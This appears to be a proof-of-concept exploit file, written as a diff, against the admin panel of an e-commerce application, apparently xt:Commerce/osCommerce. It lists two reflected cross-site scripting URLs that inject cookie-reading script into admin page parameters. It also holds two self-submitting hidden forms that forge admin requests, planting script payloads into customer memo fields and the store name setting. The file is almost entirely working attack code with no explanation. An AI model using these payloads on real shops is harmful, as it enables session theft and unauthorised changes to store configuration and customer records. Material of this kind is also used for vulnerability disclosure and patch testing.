@@ -1,0 +1,48 @@
+Cross-site scripting:
+
+http://www.example/admin/categories.php?search=prod&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example/admin/orders.php?selected_box=customers&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;status=0
+
+Html-injection:
+
+1. 
+
+&lt;form action=&quot;http://www.example/admin/customers.php?cID=1&amp;action=update&quot; method=&quot;post&quot; name=&quot;main&quot;&gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;default_address_id&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;customers_gender&quot; value=&quot;m&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;csID&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;customers_firstname&quot; value=&quot;FirstName&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;customers_lastname&quot; value=&quot;LName&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;customers_dob&quot; value=&quot;01/01/2007&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;customers_email_address&quot; value=&quot;email@example.com&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;entry_company&quot; value=&quot;company&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;entry_password&quot; value=&quot;mypass&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;memo_title&quot; value=&#039;mmtitle&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;memo_text&quot; value=&#039;txt&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+
+2. 
+
+&lt;form action=&quot;http://www.example/admin/configuration.php?gID=1&amp;action=save&quot; method=&quot;post&quot; name=&quot;main&quot;&gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;STORE_NAME&quot; value=&#039;My Store&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;STORE_OWNER&quot; value=&quot;Owner&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;STORE_OWNER_EMAIL_ADDRESS&quot; value=&quot;email@example.com&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;STORE_COUNTRY&quot; value=&quot;81&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;STORE_ZONE&quot; value=&quot;80&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;EXPECTED_PRODUCTS_SORT&quot; value=&quot;desc&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;EXPECTED_PRODUCTS_FIELD&quot; value=&quot;date_expected&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;DISPLAY_CART&quot; value=&quot;true&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;ADVANCED_SEARCH_DEFAULT_OPERATOR&quot; value=&quot;and&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;STORE_NAME_ADDRESS&quot; value=&quot;address&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;CURRENT_TEMPLATE&quot; value=&quot;xtc5&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
